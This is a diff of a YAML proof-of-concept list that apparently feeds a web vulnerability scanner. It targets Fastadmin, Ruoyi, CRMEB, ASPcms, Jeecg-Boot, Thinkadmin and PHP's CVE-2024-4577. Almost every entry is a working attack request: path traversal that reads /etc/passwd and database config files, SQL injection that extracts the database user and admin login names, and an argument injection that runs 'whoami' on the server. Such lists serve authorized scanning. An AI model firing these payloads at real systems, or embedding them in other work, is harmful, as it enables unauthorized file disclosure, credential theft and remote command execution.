@@ -1,24 +1,24 @@
 pocs:
     - metch: "get"
-      path: "/index/ajax/lang?lang=..//..//application/database"
+      path: '/index/ajax/lang?lang=..//..//application/database'
       body:
         - "jsonpReturn"
       matchers-condition: or
       name: "Fastadmin file read"
     - metch: "get"
-      path: "/common/download/resource?resource=/profile/../../../../../../../../../../etc/passwd"
+      path: '/common/download/resource?resource=/profile/../../../../../../../../../../etc/passwd'
       body:
         - "root:x"
       matchers-condition: or
       name : "Ruoyi file read"
     - metch: "get"
-      path: "/index.php/ApiAdminKefu/index?aid=3&uid=3"
+      path: '/index.php/ApiAdminKefu/index?aid=3&uid=3'
       body:
         - "status"
       matchers-condition: or
       name: "Diandiancms sql vuln"
     - metch: "get"
-      path: "/include/thumb.php?dir=http\..\..\config\config_db.php"
+      path: '/include/thumb.php?dir=http\..\..\config\config_db.php'
       body:
         - "<?php"
       matchers-condition: or
@@ -30,31 +30,31 @@ pocs:
       name: "Eyoucms sql file read"
       matchers-condition: or
     - metch: "get"
-      path: "/api/products?sid=1%27"
+      path: '/api/products?sid=1%27'
       body:
         - "SQLSTATE"
       matchers-condition: or
       name: "Crmeb sql vuln"
     - metch: "get"
-      path: "/api/products?limit=20&priceOrder=&salesOrder=&selectId=GTID_SUBSET(CONCAT(0x7e,(SELECT+(ELT(3550=3550,md5(1)))),0x7e),3550)"
+      path: '/api/products?limit=20&priceOrder=&salesOrder=&selectId=GTID_SUBSET(CONCAT(0x7e,(SELECT+(ELT(3550=3550,md5(1)))),0x7e),3550)'
       body:
         - "SQLSTATE"
       matchers-condition: or
       name: "Crmeb sql vuln"
     - metch: "post"
-      path: "/webui/?g=sys_dia_data_down&file_name=../../../../../../../../../etc/passwd"
+      path: '/webui/?g=sys_dia_data_down&file_name=../../../../../../../../../etc/passwd'
       body:
         - "root:x"
       matchers-condition: or
       name: "JQuery file read"
     - metch: "get"
-      path: "/plug/comment/commentList.asp?id=-1%20unmasterion%20semasterlect%20top%201%20UserID,GroupID,LoginName,Password,now(),null,1%20%20frmasterom%20{prefix}user"
+      path: '/plug/comment/commentList.asp?id=-1%20unmasterion%20semasterlect%20top%201%20UserID,GroupID,LoginName,Password,now(),null,1%20%20frmasterom%20{prefix}user'
       body:
         - "root:x"
       matchers-condition: or
       name: "ASPcms sql vuln"
     - metch: "get"
-      path: "/aspcms/admin_aspcms/_content/_Content/AspCms_ContentFun.asp?action=tdel&id=2=iif(((select asc(mid(LoginName,1,1)) from AspCms_User where UserID=1)=97),2,chr(97))"
+      path: '/aspcms/admin_aspcms/_content/_Content/AspCms_ContentFun.asp?action=tdel&id=2=iif(((select asc(mid(LoginName,1,1)) from AspCms_User where UserID=1)=97),2,chr(97))'
       body:
         - "删除成功"
         - "数据类型不匹配"
@@ -67,45 +67,97 @@ pocs:
       matchers-condition: or
       name: "PBootCms sql vuln"
     - metch: "post"
-      path: "/?%ADd+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input"
+      path: '/?%ADd+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input'
       body:
         - "1337"
       data: "whoami;echo 1337; die;"
       matchers-condition: or
       name: "PHP CVE-2024-4577 vuln"
     - metch: "get"
-      path: "/assets/file:%2f%2f/etc/passwd"
+      path: '/assets/file:%2f%2f/etc/passwd'
       body:
         - "/etc/passwd is no"
-      matchers-condition: or
-      name: "Ruby file read"
-    - metch: "get"
-      path: "/assets/file:%2f%2f/etc/passwd"
-      body:
         - "root:x"
       matchers-condition: or
-      header:
-        - "Accept-Encoding": "gzip,deflate"
-        - "Accept": "../../../../../../../../etc/passwd{{"
       name: "Ruby file read"
     - metch: "get"
-      path: "/admin.html?s=admin/api.Update/get/encode/34392q302x2r1b37382p382x2r1b1a1a1b1a1a1b2r33322u2x2v1b2s2p382p2q2p372t0y342w34"
+      path: '/admin.html?s=admin/api.Update/get/encode/34392q302x2r1b37382p382x2r1b1a1a1b1a1a1b2r33322u2x2v1b2s2p382p2q2p372t0y342w34'
       body:
         - "读取文件成功"
       matchers-condition: or
       name: "Thinadmin file read"
     - metch: "get"
-      path: "/admin.html?s=admin/api.Update/get/encode/34392q302x2r1b37382p382x2r1b1a1a1b1a1a1b1a1a1b1a1a1b1a1a1b1a1a1b1a1a1b1a1a1b1a1a1b2t382r1b342p37373b2s"
+      path: '/admin.html?s=admin/api.Update/get/encode/34392q302x2r1b37382p382x2r1b1a1a1b1a1a1b1a1a1b1a1a1b1a1a1b1a1a1b1a1a1b1a1a1b1a1a1b2t382r1b342p37373b2s'
       body:
         - "读取文件成功"
       matchers-condition: or
       name: "Thinadmin file read"
     - metch: "post"
-      path: "/jeecg-boot/jmreport/qurestSql"
+      path: '/jeecg-boot/jmreport/qurestSql'
       body:
         - "XPATH"
       json: {"apiSelectId":"1290104038414721025","id":"1' or '%1%' like (updatexml(0x3a,concat(1,(select current_user)),1)) or '%%' like '"}
       header:
-        "Content-Type":"application/json"
+        Content-Type: "application/json"
       matchers-condition: or
       name: "Jeecg-Boot sql vuln"
+    - metch: "get"
+      path: '/common/download/resource?name=/profile/../../../../../../../etc/passwd'
+      body:
+        - "root:x"
+      matchers-condition: or
+      name: "Ruoyi file read"
+    - metch: "get"
+      path: '/common/download/resource?resource=/profile/../../../../../../../windows/win.ini'
+      body:
+        - "for 16-bit app support"
+      matchers-condition: or
+      name: "Ruoyi file read"
+    - metch: "get"
+      path: '/common/download?fileName=../../../../etc/passwd&delete=false'
+      body:
+        - "root:x"
+      matchers-condition: or
+      name: "Ruoyi file read"
+    - metch: "get"
+      path: '/common/download?delete=false&fileName=../../../../../etc/passwd'
+      body:
+        - "root:x"
+      matchers-condition: or
+      name: "Ruoyi file read"
+    - metch: "get"
+      path: '/system/dept/list?dataScope=and+extractvalue(1,concat(0x7e,(select+user()),0x7e))'
+      body:
+        - "SQLSTATE"
+      matchers-condition: or
+      name: "Ruoyi sql vuln"
+    - metch: "get"
+      path: '/system/role/list?dataScope=and+extractvalue(1,concat(0x7e,(select+user()),0x7e))'
+      body:
+        - "SQLSTATE"
+      matchers-condition: or
+      name: "Ruoyi sql vuln"
+    - metch: "get"
+      path: '/system/user/list?dataScope=and+extractvalue(1,concat(0x7e,(select+user()),0x7e))'
+      body:
+        - "SQLSTATE"
+      matchers-condition: or
+      name: "Ruoyi sql vuln"
+    - metch: "get"
+      path: '/system/dept/list?params%5BdataScope%5D=and+extractvalue(1,concat(0x7e,(select+user()),0x7e))'
+      body:
+        - "SQLSTATE"
+      matchers-condition: or
+      name: "Ruoyi sql vuln"
+    - metch: "get"
+      path: '/system/role/list?params%5BdataScope%5D=and+extractvalue(1,concat(0x7e,(select+user()),0x7e))'
+      body:
+        - "SQLSTATE"
+      matchers-condition: or
+      name: "Ruoyi sql vuln"
+    - metch: "get"
+      path: '/system/user/list?params%5BdataScope%5D=and+extractvalue(1,concat(0x7e,(select+user()),0x7e))'
+      body:
+        - "SQLSTATE"
+      matchers-condition: or
+      name: "Ruoyi sql vuln"
